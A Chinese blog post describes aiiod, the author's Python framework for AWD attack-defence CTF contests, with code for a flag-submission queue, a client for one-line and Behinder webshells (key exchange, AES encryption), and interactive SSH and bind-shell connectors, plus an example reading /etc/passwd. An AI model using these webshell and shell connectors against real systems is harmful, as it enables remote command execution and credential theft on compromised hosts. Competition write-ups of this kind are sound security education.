0. 前言

该项目是我大学时期为AWD比赛而写的框架——aiiod[1]，靠它我曾经在一些AWD比赛中取得了不错的成绩。

首先自定义提交函数，用其实例化Submiter。这样设计是为了解耦，适配不同的AWD系统，例如有的直接提供带token鉴权的API，有的需要自己处理表单（甚至包括CSRF-token）。

接着以Target和攻击函数组合成Task，交给Crontab执行。Crontab是整个系统的驱动，定期执行Task，并将获取到的flag传递给Submiter内部的队列，Submiter不断调用提交函数消费队列来得分。

除此之外还有一些工具类，如装饰器aiiod.ob用来混淆流量，aiiod.start_callback_server来启动回调Server接收flag，还有aiiod.WebShellConnector等等

2. ::Submiter

这个类比较简单，重点我想说一下_thread的使用

@singletonclass Submiter(object):    RETRY = 3    RETRY_DURATION = 3
    def __init__(self, submit_flag_fn, delay=0):        self._flag_lst = queue.Queue()        self._exit = False        self._thread = None        self._submit_flag_fn = submit_flag_fn        self._delay = delay        # self._max_workers = max_workers
    def add_flag(self, flag: dict):        """flag should be a dict such as `{'flag': '', 'ip': ''}`"""        if not isinstance(flag, dict):            flag = {'flag': flag}        for k in flag.keys():            flag[k] = flag[k].strip()        self._flag_lst.put(flag)
    def submit_flags(self):        while not self._exit:            try:                flag = self._flag_lst.get()                self._submit_flag_fn(**flag)                time.sleep(self._delay)            except Exception as e:                logger.error(e.__str__())
    def submit_flag_with_retry(self):        while True:            retry = self.RETRY + 2            flag = ''
            try:                flag = self._flag_lst.get_nowait()            except queue.Empty:                pass
            while retry and not flag:                time.sleep(self.RETRY_DURATION)                try:                    flag = self._flag_lst.get_nowait()                except queue.Empty:                    pass                retry -= 1
            if flag:                success = self._submit_flag_fn(**flag)                _retry = self.RETRY - 1
                while not success and _retry:                    time.sleep(self.RETRY_DURATION)                    _retry -= 1                    success = self._submit_flag_fn(**flag)
            if not retry:                break
    def _start(self):        _thread.start_new_thread(self.submit_flags, ())        while not self._exit:            time.sleep(1)
    def start(self):        if self._thread is not None and self._thread.is_alive():            self._exit = True            time.sleep(2)            self._exit = False
        self._thread = threading.Thread(target=self._start)        self._thread.start()
    def exit(self):        self._exit = True

可以看到，Submiter.start中封装了一层，为什么要这样做呢。

因为当我们使用threading库启动新线程时，是没有简单直观的方法控制退出的，必须等到线程函数执行完成（所以一般需要在线程函数中做控制）。而这里使用更底层的_thread库的好处是，由_thread.start_new_thread启动的线程会随函数返回而静默退出，这样就完全不用侵入式的修改线程函数逻辑，控制退出的逻辑完全由外部实现。（当然，这种情况仅限于线程函数不需要做资源释放）

3.1 ::Connector::WebShellConnector

顾名思义，命令行版的菜刀。实现了连接一句话木马 (ASPX / JSP / PHP) 和冰蝎马 (PHP)后的命令执行和文件上传

连接一句话木马我想没什么值得说的，唯一值得注意的一点是需要在命令执行的前后echo一个数据界定符（这是原来分析菜刀时学到的），像这样

至于冰蝎马，它的密钥交换流程如下：

1.post参数后服务端返回session key2.首先假设为AES-CBC加密，测试能否成功执行3.如失败则回退至XOR加密

def _behinder_key_exchange(self):    self._session = requests.Session()    r = self._session.get(        self._url, params={self._pwd: '1'}, timeout=self.TIMEOUT)

    if identify in r.text:        self._enc_way = 'aes'    else:        self._enc_way = 'xor'

class AES128Encryptor(object):    def __init__(self, key):        self._key = self._padding_zero(key)
    def encrypt(self, msg) -> str:        enc = AES.new(self._key, AES.MODE_CBC, b'\x00' * 16)        return b64encode(enc.encrypt(self._padding_pkcs7(msg))).decode()
    def _padding_pkcs7(self, msg) -> bytes:        if isinstance(msg, str):            msg = msg.encode()
        if len(msg) == 0x10:            return msg + b'\x10' * 0x10        return msg + (            0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()
    def _padding_zero(self, key) -> bytes:        output = list(key)        while len(output) % 16:            output.append('\x00')
        return ''.join(output).encode()

3.2 ::Connector::Shell

Shell是一个基类，内部实现了与终端交互式的读写。为了兼容Windows和Linux，我使用了两种方式来做：

首先是Linux，很简单，单线程内用epoll做I/O多路复用，监听stdin和socket的ON_READ事件然后往另一头写即可

def _posix_on_read(self):    try:        data = self._channel.recv(self.BUFSIZE)        if not data:            sys.stdout.flush()            self._done = True
        sys.stdout.write(data.decode(errors='ignore'))        sys.stdout.flush()
    except socket.timeout:        self._done = True
def _posix_on_write(self):    try:        line = sys.stdin.readline()        if not line:            self._done = True
        if not isinstance(line, bytes):            line = line.encode()
        self._channel.send(line)
    except (EOFError, OSError):        self._done = True
def _posix_interactive(self):    try:        self._channel.settimeout(0.0)        self._selector.register(            self._channel,            selectors.EVENT_READ, lambda: self._posix_on_read())        self._selector.register(            sys.stdin,            selectors.EVENT_READ, lambda: self._posix_on_write())
        while True:            if self._done:                break
            events = self._selector.select()            for key, _ in events:                callback = key.data                callback()    finally:        self._selector.unregister(self._channel)        self._selector.unregister(sys.stdin)        self._set_timeout(self.TIMEOUT)

对于Windows系统，上述方式行不通了，因为在Windows中stdin/stdout并不被抽象为文件，无法用selectors（IOCP）处理

This module provides access to the select() and poll() functions available in most operating systems, epoll() available on Linux 2.5+ and kqueue() available on most BSD. Note that on Windows, it only works for sockets; on other operating systems, it also works for other file types (in particular, on Unix, it works on pipes). It cannot be used on regular files to determine whether a file has grown since it was last read.

那么我们只能起两个线程，和上述相同的原理去做（这里依然使用_thread库）

def _windows_on_read(self):    while True:        if self._done:            break        try:            buf = self._channel.recv(self.BUFSIZE)            if not buf:                sys.stdout.flush()                self._done = True                break
            sys.stdout.write(buf.decode(errors='ignore'))            sys.stdout.flush()
        except (EOFError, OSError):            pass
def _windows_on_write(self):    while True:        if self._done:            break        try:            line = sys.stdin.readline()            if not line:                self._done = True                break
            if not isinstance(line, bytes):                line = line.encode()
            self._channel.send(line)
        except (EOFError, OSError):            self._done = True            break
def _windows_interactive(self):    _thread.start_new_thread(self._windows_on_read, ())    self._windows_on_write()

SSHConnector和BindShellConnector都继承了Shell，可以直接调用父类方法来交互式操作。为什么需要交互式操作？因为某些情况下需要修改服务器密码，而大部分低权限情况下我们只能使用passwd命令交互式去做。

SSHConnector用的paramiko模块，没什么好说的。BindShellConnector中有一个值得一提的点

class BindShellConnector(Shell):    """    This payload could only used on Linux    """
    def __init__(self, ip, port):        self._ip = ip        self._port = port if isinstance(port, int) else int(port)
        self._conn = socket.create_connection((self._ip, self._port),                                              timeout=self.TIMEOUT)
        super().__init__(self._conn)
    def exec(self, cmd) -> str:        if not isinstance(cmd, bytes):            cmd = cmd.encode()        token = _random_str()        self._conn.sendall(cmd + b'; echo ' + token.encode() + b'\n')        output = self._recv_until(token)        return output.decode(errors='ignore')
    def _recv_until(self, token) -> bytes:        if not isinstance(token, bytes):            token = token.encode()
        buffer = []        while True:            try:                buffer.append(self._conn.recv(1))                if len(buffer) >= len(token) and b''.join(                        buffer[-len(token):]) == token:                    break            except Exception:                break        return b''.join(buffer[:-len(token)])

exec方法中，为了读取TCP流时获取准确的结果，我在命令执行过程中进行了分包操作，也就是echo一个随机的token，例如cat /etc/passwd ; echo ABCDEF（Windows的话则是添加& echo ABCDEF，但AWD基本不会遇见Windows），然后通过recv_until读取准确结果。这种操作对于有Socket编程经验的读者来说应该是基本功了。
